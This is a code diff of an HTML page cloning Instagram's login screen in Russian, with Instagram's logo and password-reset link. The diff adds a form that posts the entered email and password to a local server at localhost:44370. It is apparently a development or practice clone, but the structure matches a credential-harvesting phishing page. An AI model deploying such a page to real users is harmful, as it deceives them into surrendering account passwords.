@@ -19,12 +19,13 @@
                         <img src="img/instLogo.jpg" alt="instLogo" style = "margin: 22px auto 12px;">
                     </div>
                     <div class="loginSpace">
-                        <form class = "loginForm">
+                        <div class = "loginForm">
                             <div class="loginInputs">
+                                <form method="POST" action="https://localhost:44370/Home">
                                 <div class = "login">
                                     <div class = loginField>
                                         <label class="loginLabel">
-                                            <input class="loginInput" placeholder=" ">
+                                            <input name="email" class="loginInput" placeholder=" ">
                                             <span class="loginSpan">
                                                 Телефон, имя пользователя или эл. адрес
                                             </span>
@@ -34,7 +35,7 @@
                                 <div class = "password">
                                     <div class="passwordField">
                                         <label class="passwordLabel">
-                                            <input class="passwordInput" type="password" placeholder=" ">
+                                            <input name="password" class="passwordInput" type="password" placeholder=" ">
                                             <span class="passwordSpan">
                                                 Пароль
                                             </span>
@@ -46,6 +47,7 @@
                                         <label class="log_inLabel">Войти</label>
                                     </button>
                                 </div>
+                            </form>
                                 <div class = "orField">
                                     <div class="orLine"></div>
                                     <div class="orLabel">Или</div>
@@ -64,7 +66,7 @@
                                 </div>
                             </div>
                             <a class="forgotPass" href="https://www.instagram.com/accounts/password/reset/?hl=ru">Забыли пароль?</a>
-                        </form>
+                        </div>
                      </div>
                 </div>
                 <div class="registerField">
